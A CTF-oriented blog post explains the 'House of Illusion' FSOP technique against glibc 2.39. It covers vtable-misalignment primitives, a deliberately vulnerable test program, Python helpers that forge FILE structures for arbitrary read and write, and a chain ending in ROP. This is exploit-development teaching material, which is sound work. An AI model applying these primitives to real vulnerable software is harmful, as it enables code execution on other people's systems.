---
layout: post
title: "House of Illusion: Classic FSOP chain in modern glibc"
date: 2025-08-21
last_modified_at: 2025-09-08
categories:
  - pwning
---

> I assume readers are somewhat familiar with FILE structure exploitation, perhaps not advanced, but with enough basics to understand the content.

## The beginning of everything

Original FSOP was common technique which abuses moving `vtable` of a file pointer to an arbitrary location, point it at any desire address, turn it into control execution flow. However, from glibc `2.24`, developers introduced a mitigation to this kind of attack:

```c
/* from: https://elixir.bootlin.com/glibc/glibc-2.39/source/libio/libioP.h#L1022 */
...
/* Perform vtable pointer validation.  If validation fails, terminate
   the process.  */
static inline const struct _IO_jump_t *
IO_validate_vtable (const struct _IO_jump_t *vtable)
{
  uintptr_t ptr = (uintptr_t) vtable;
  uintptr_t offset = ptr - (uintptr_t) &__io_vtables;
  if (__glibc_unlikely (offset >= IO_VTABLES_LEN))
    /* The vtable pointer is not in the expected section.  Use the
       slow path, which will terminate the process if necessary.  */
    _IO_vtable_check ();
  return vtable;
}
...
```

In short, this mitigation makes sure `vtable` have to be within the glibc's `__io_vtables` section, or the process will exit. In current CTF's "meta", the most popular way to bypass is using the fact that check only makes sure `vtable` is within the range, which means we can still misalign `vtable` pointer so that different function pointers within `__io_vtables` section will be invoked (this is important, please keep it in mind).

You can find many docs about that one, such as [**@kylebot's post**](https://blog.kylebot.net/2022/10/22/angry-FSROP/) or [**@niftic's post**](https://niftic.ca/posts/fsop/)... When learning it, I realized that most of discovered paths involved `_wide_data's vtable` or `_codecvt's FCT`. A question come to my mind: **"What if developers patch `_vtable_check` into those field? Those series will become invalid!"**. After few days research, I found out there exists a technique - `house of illusion/some` which can answer this.

`House of Illusion` was originally found by [**@Csome**](https://blog.csome.cc/p/house-of-some/) and [**@enllus1on**](https://enllus1on.github.io/2024/01/22/new-read-write-primitive-in-glibc-2-38/#more), when they having the same question. In this blog post, I will demonstrate what I’ve learned, analyze how it works, evaluate its effectiveness and provide some template to reuse later.

## Pre-requisites

This attack concept has significant impact and can/may be applied to future high glibc's versions. For it to succeed, the following conditions must be met: 
- You can leak glibc's base addresses.
- You have controllable and known address, content can be written to construct a fake file structure (prefer a buffer which is harmless to the program’s execution).
- The program can exit normally (return from `main`) or through `exit()` function.
- You have a primitive that can insert controllable address to the file stream's linked list. That means you can overwrite `_IO_list_all` or `stdin`/`stdout`/`stderr`'s chain or any other file handler opened by `fopen()`'s chain field (be careful with the case where the file may be unlinked before the program exits).

## C program code for our experiments

Here is small C program that I used for experiments:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main() {
    setbuf(stdin, 0);
    setbuf(stdout, 0);
    setbuf(stderr, 0);
    long addr, size, *ptr;
    int choice;
    printf("libc stdout leak: %p\n", stdout);
    while(1)
    {
        puts("1. create buffer");
        puts("2. arbitrary write");
        puts("3. exit");
        printf("choice: ");
        scanf("%d", &choice);
        if(choice == 1)
        {
            ptr = malloc(0xe0);
            printf("new buffer at address: %p\n", ptr);
            printf("data: ");
            read(0, ptr, 0xe0);
        }
        else if(choice == 2)
        {
            printf("addr: ");
            scanf("%ld", &addr);
            printf("data: ");
            read(0, (long *)addr, 8);
        }
        else exit(0);
    }
}
```

Very simple and more than enough. I will use glibc `2.39` as an example, since it is common in the current CTF meta at the time of writing (`2.4x` is still not applicable). All the essential files can be found [**@here**](https://github.com/lieuhoaisa/house_of_illusion) (including code, binaries, libc, exploit payload).

## Utilization ideas

When the program return from `main` function or executes `exit()` function, `_IO_flush_all` will be called to flush all file stream in the file's linked list. The call chain is:

```c
exit()
|_ _IO_cleanup
   |_ _IO_flush_all
      |_ _IO_OVERFLOW
```

Let’s take a closer look at the `_IO_flush_all` function:

```c
/* from: https://elixir.bootlin.com/glibc/glibc-2.39/source/libio/genops.c#L685 */
...
  for (fp = (FILE *) _IO_list_all; fp != NULL; fp = fp->_chain)
    {
      ...
      if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)
	   || (_IO_vtable_offset (fp) == 0
	       && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr
				    > fp->_wide_data->_IO_write_base))
	   )
	  && _IO_OVERFLOW (fp, EOF) == EOF)
	  ...
    }
...
```

In glibc, the `_IO_list_all` variable is a linked list that holds all FILE structures in the binary. By default, it points to `stderr` first, the next elements in the list are linked using the `_chain` field.

`_IO_flush_all` goes through all available FILE structures (using `_IO_list_all` as mentioned earlier). If certain conditions are met, it will call `_IO_OVERFLOW(fp, EOF)`. This function then makes a call to the function pointer stored in `fp.vtable[__overflow]`.

```c
#define _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH)
```

Keep in mind that `_IO_OVERFLOW` is a macro, invoked by indexing the vtable. This means it can be misaligned to achieve an primitive, specifically in this case, it will be arbitrary read and write.

> This can be a little confused (due to my function naming), but keep in mind that arbitrary read give us a "leak", arbitrary write give us a "overwrite". `read` function give arbitrary write, `write` function give arbitrary read...

### Arbitrary read primitive (leaking)

This is very simple and has been discussed before, using `_IO_write_base` and `_IO_write_ptr` implementing an arbitrary address reading. There are many tutorial specific principles on the Internet. I will take advantage of `_IO_new_file_overflow` function:

```c
/* from: https://elixir.bootlin.com/glibc/glibc-2.39/source/libio/fileops.c#L731 */
int
_IO_new_file_overflow (FILE *f, int ch)
{
  if (f->_flags & _IO_NO_WRITES) /* SET ERROR */
    {
      ...
      return EOF;
    }
  /* If currently reading or no buffer allocated. */
  if ((f->_flags & _IO_CURRENTLY_PUTTING) == 0 || f->_IO_write_base == NULL)
    {
      ...
    }
  if (ch == EOF)
    return _IO_do_write (f, f->_IO_write_base,
			 f->_IO_write_ptr - f->_IO_write_base);
...
}
```

```c
/* from: https://elixir.bootlin.com/glibc/glibc-2.39/source/libio/fileops.c#L423 */
int
_IO_new_do_write (FILE *fp, const char *data, size_t to_do)
{
  return (to_do == 0
	  || (size_t) new_do_write (fp, data, to_do) == to_do) ? 0 : EOF;
}
libc_hidden_ver (_IO_new_do_write, _IO_do_write)
```

```c
/* from: https://elixir.bootlin.com/glibc/glibc-2.39/source/libio/fileops.c#L431 */
static size_t
new_do_write (FILE *fp, const char *data, size_t to_do)
{
  size_t count;
  if (fp->_flags & _IO_IS_APPENDING)
    ...
    fp->_offset = _IO_pos_BAD;
  else if (fp->_IO_read_end != fp->_IO_write_base)
    {
    ...
    }
  count = _IO_SYSWRITE (fp, data, to_do);
  ...
}
```

```c
#define _IO_SYSWRITE(FP, DATA, LEN) JUMP2 (__write, FP, DATA, LEN)
```

So basically, we hijack the `vtable`, and set up some file structure's fields so the `_IO_OVERFLOW(fp, EOF)` will call `_IO_new_file_overflow`, end up with `_IO_SYSWRITE`. At that time, `fp.vtable[__write]` actually pointing to `_IO_new_file_write` and print out the data, give us a leak. 

```c
/* from: https://elixir.bootlin.com/glibc/glibc-2.39/source/libio/fileops.c#L1173 */
ssize_t
_IO_new_file_write (FILE *f, const void *data, ssize_t n)
{
  ssize_t to_do = n;
  while (to_do > 0)
    {
      ssize_t count = (__builtin_expect (f->_flags2
                                         & _IO_FLAGS2_NOTCANCEL, 0)
			   ? __write_nocancel (f->_fileno, data, to_do)
			   : __write (f->_fileno, data, to_do));
      ...
    }
  ...
}
```

The call chain is:

```c
_IO_new_file_overflow(f, EOF)
|_ _IO_new_do_write (f, f->_IO_write_base, f->_IO_write_ptr - f->_IO_write_base)
   |_ new_do_write (f, f->_IO_write_base, f->_IO_write_ptr - f->_IO_write_base)
      |_ _IO_new_file_write (f, f->_IO_write_base, f->_IO_write_ptr - f->_IO_write_base)
         |_ write (f->_fileno, f->_IO_write_base, f->_IO_write_ptr - f->_IO_write_base)
```

There are some conditions need to be met, since you can easily understand those by yourself, I won't go into details. We can construct a read primitive `fp` like this:

```python
def fake_io_write(write_addr, leng, next_file):
	global _IO_file_jumps
	payload = fit({
	    0x00: 0x8000 | 0x800 | 0x1000, #_flags
	    0x20: write_addr, #_IO_write_base
	    0x28: write_addr + leng, #_IO_write_ptr
	    0x68: next_file, #_chain
	    0x70: 1, # _fileno
	    0xc0: 0, #_modes
	    0xd8: _IO_file_jumps, #_vtables
	}, filler=b'\x00')
	return payload
```

### Arbitrary write primitive (overwriting)

Let's refresh how the `_IO_file_jumps` looks like:

```c
/* from: https://elixir.bootlin.com/glibc/glibc-2.39/source/libio/vtables.c#L142 */
  /* _IO_file_jumps  */
  [IO_FILE_JUMPS] = {
    JUMP_INIT_DUMMY, // dummy things
    JUMP_INIT (finish, _IO_file_finish), // ptrs starting from here, offset 0x10
    JUMP_INIT (overflow, _IO_file_overflow),
    JUMP_INIT (underflow, _IO_file_underflow),
    JUMP_INIT (uflow, _IO_default_uflow),
    JUMP_INIT (pbackfail, _IO_default_pbackfail),
    JUMP_INIT (xsputn, _IO_file_xsputn),
    JUMP_INIT (xsgetn, _IO_file_xsgetn),
    JUMP_INIT (seekoff, _IO_new_file_seekoff),
    JUMP_INIT (seekpos, _IO_default_seekpos),
    JUMP_INIT (setbuf, _IO_new_file_setbuf),
    JUMP_INIT (sync, _IO_new_file_sync),
    JUMP_INIT (doallocate, _IO_file_doallocate),
    JUMP_INIT (read, _IO_file_read),
    JUMP_INIT (write, _IO_new_file_write),
    JUMP_INIT (seek, _IO_file_seek),
    JUMP_INIT (close, _IO_file_close),
    JUMP_INIT (stat, _IO_file_stat),
    JUMP_INIT (showmanyc, _IO_default_showmanyc),
    JUMP_INIT (imbue, _IO_default_imbue)
  }
```

In arbitrary read primitive, we call `_IO_new_file_overflow` and `_IO_new_file_write`, corresponding to the offset `0x18` and `0x78`.

If we subtract `0x8` bytes from `vtable` (currently is `_IO_file_jumps`), the `_IO_OVERFLOW(fp, EOF)` will call to `_IO_new_file_finish`:

```c
/* from: https://elixir.bootlin.com/glibc/glibc-2.39/source/libio/fileops.c#L167 */
void
_IO_new_file_finish (FILE *fp, int dummy)
{
  if (_IO_file_is_open (fp))
    {
      _IO_do_flush (fp);
      if (!(fp->_flags & _IO_DELETE_DONT_CLOSE))
	_IO_SYSCLOSE (fp);
    }
  _IO_default_finish (fp, 0);
}
libc_hidden_ver (_IO_new_file_finish, _IO_file_finish)
```

```c
/* from: https://elixir.bootlin.com/glibc/glibc-2.39/source/libio/libioP.h#L555 */
#define _IO_do_flush(_f) \
  ((_f)->_mode <= 0							      \
   ? _IO_do_write(_f, (_f)->_IO_write_base,				      \
		  (_f)->_IO_write_ptr-(_f)->_IO_write_base)		      \
   : _IO_wdo_write(_f, (_f)->_wide_data->_IO_write_base,		      \
		   ((_f)->_wide_data->_IO_write_ptr			      \
		    - (_f)->_wide_data->_IO_write_base)))
```

It just so happens that there is one `_IO_do_write` call in it. And when `_IO_SYSWRITE` is reached, program call function via indexing the `vtable`, take a value at offset `&_vtables + 0x78` which is now actually point to `_IO_file_read` because we were shifted the `vtable` `0x8` bytes back! 

```c
/* from: https://elixir.bootlin.com/glibc/glibc-2.39/source/libio/fileops.c#L1130 */
ssize_t
_IO_file_read (FILE *fp, void *buf, ssize_t size)
{
  return (__builtin_expect (fp->_flags2 & _IO_FLAGS2_NOTCANCEL, 0)
	  ? __read_nocancel (fp->_fileno, buf, size)
	  : __read (fp->_fileno, buf, size));
}
libc_hidden_def (_IO_file_read)
```

The call chain is:

```c
_IO_new_file_finish (f, EOF) // due to misaligned vtable
|_ _IO_new_do_write (f, f->_IO_write_base, f->_IO_write_ptr - f->_IO_write_base)
   |_ ...
      |_ _IO_file_read (f, f->_IO_write_base, f->_IO_write_ptr - f->_IO_write_base) // due to misaligned vtable
         |_ read (f->_fileno, f->_IO_write_base, f->_IO_write_ptr - f->_IO_write_base)
```

Once again, I won't go into details about the conditions, but here, we can construct a write primitive `fp` like this:

```python
def fake_io_read(read_addr, leng, next_file):
	global _IO_file_jumps
	payload = fit({
	    0x00: 0x8000 | 0x40 | 0x1000, #_flags
	    0x20: read_addr, #_IO_write_base
	    0x28: read_addr + leng, #_IO_write_ptr
	    0x68: next_file, #_chain
	    0x70: 0, # _fileno
	    0xc0: 0, #_modes
	    0xd8: _IO_file_jumps - 0x8, #_vtables
	}, filler=b'\x00')
	return payload
```

### FSOP chains

We finished our fake file structure payload that can read or write any address, now we need to string them together, via the the `_chain` field, to achieve a powerful attack effect. Unlike the original author, I divide the attack process into few steps, which will be described details below:

> From this point, I will refer the "fake file structure" as `fp`. 

**Step 1. Insert a `fp` into file stream's linked list**:
You can write to any active file stream's `_chain` field or target the `_IO_list_all`. In this step, you need to prepare a fake file with overwrite primitive (essential), remember to set up it's field before linking it. I suggest you to set up `_IO_write_base` and `_IO_write_ptr` large enough to place at least two (consecutive) another `fp`. Then you can forge the program exit, trigger our exploit chain.

![](/assets/images/house_of_illusion/img00.png)

**Step 2. Flushing the first `fp`, expand the fake file chain**:
When the program try to flush the first `fp`, it will give us an arbitrary write, we using this to craft two other `fp`. The second `fp` pointing to target address (can be read or write depend on purpose), the third `fp` (must be overwrite primitive) point back to our first `fp`. 

![](/assets/images/house_of_illusion/img01.png)

**Step 3. Flushing the second `fp`, achieve primitive**:
When the program try to flush the second `fp`, depend on what you prepared from **step 2**, it can be arbitrary read or write. Using this to overwrite or leak more essential datas.

**Step 4. Flushing the third `fp`, restore the first one**:
When the first `fp` be flushed, it's pointer (field) will be zero out, so we use the third `fp` to restore it. At this time having an arbitrary write, we will set up the first `fp` like what we did in **step 1**. “After finishing, the program continues flushing the next file by following the `_chain` field, which now points to the first `fp`. This means execution returns to **step 2**.

**Abusing**:
The reason I set up like that, is to create an endless arbitrary read/write loop, also to reduce buffer memories. If you want to break, just need to zero out one of their `_chain` field. Now the problem become a write-what-where problem. Here I choose to leak `__environ` value and perform ROP chain on stack. Full example exploit can be found [**@here**](https://github.com/lieuhoaisa/house_of_illusion/blob/main/ex.py).

## Pros and cons

### Pros

The exploit chain is analyzed from the source code, does not rely on binary compilation results (does not include any specific gadgets), and can ignore the (future) `vtable`'s check in `wide_data` or `_codecvt`, which leads to very powerful versatility. At the same time, the exploit ends up with ROP chain, most effective and violent attack method. With our endless arbitrary read/write loop, we can easily bypass stack mitigations or even workaround with `seccomp` filters (`read` and `write` syscall need to be allowed in order to works). Besides, `house of illusion`'s pre-requisites can easily met in heap pwning.

### Cons

But I doubting if it works against "clearly" FSOP challenges. I spent a few days testing and have results. I found out `house of illusion` depend a lot of the fact that `_IO_flush_all` will call `_IO_OVERFLOW` since we hijacked `vtable` based on this function so that we can achieve arbitrary read/write. Question is: **"Is there any other way to hijack vtable depend on other functions? Thats mean program won't call  `_IO_OVERFLOW` or it will call other `_IO`'s function using vtable indexing before overflow - which can causes errors because of misaligned `vtable`"**. The answer is: **depending on how the program interactive with the file**.  Take an example of challenge [**@byor**](https://github.com/nobodyisnobody/write-ups/tree/main/Hack.lu.CTF.2022/pwn/byor) from **HackluCTF 2022**:

![](/assets/images/house_of_illusion/img02.png)

We have a libc leak and full control over `stdout`. Pretend that `_wide_data` and `_codecvt` have been patched. Is there any way we can perform `house of illusion`? If we can overwrite more than `0xE0` bytes, yes we can attack the `stdout`'s `_chain` field while prepare a fake file structure after it. But it's not happens here. What if we construct `stdout` to be a first fake file? So when the program call `puts`, which end up with calling `_IO_XSPUTN`, at that time, `stdout`'s `vtable` has been hijacked, so the program may occurs some unexpected behaviours, in the worst case, encounter an error that prevents reaching the flush. If we dont have that `puts` code line at the end, its would be great... I think this is a disadvantage of `house of illusion`, since we can not control `RIP` directly via one time hijacking/triggering `vtable` like current existing paths (`_wide_data`, `_codecvt`,...). After all, our exploit chain only started to take action when the program call `_IO_flush_all`.

## Summary 

`House of Illusion` revived the original FSOP process (the RWRWR process), bringing us back to the form first proposed by **angelboy**. By chaining fake files together one by one and repeatedly invoking `_IO_OVERFLOW` through them, we achieved multiple leaks, enabling arbitrary address traversal and content modification.

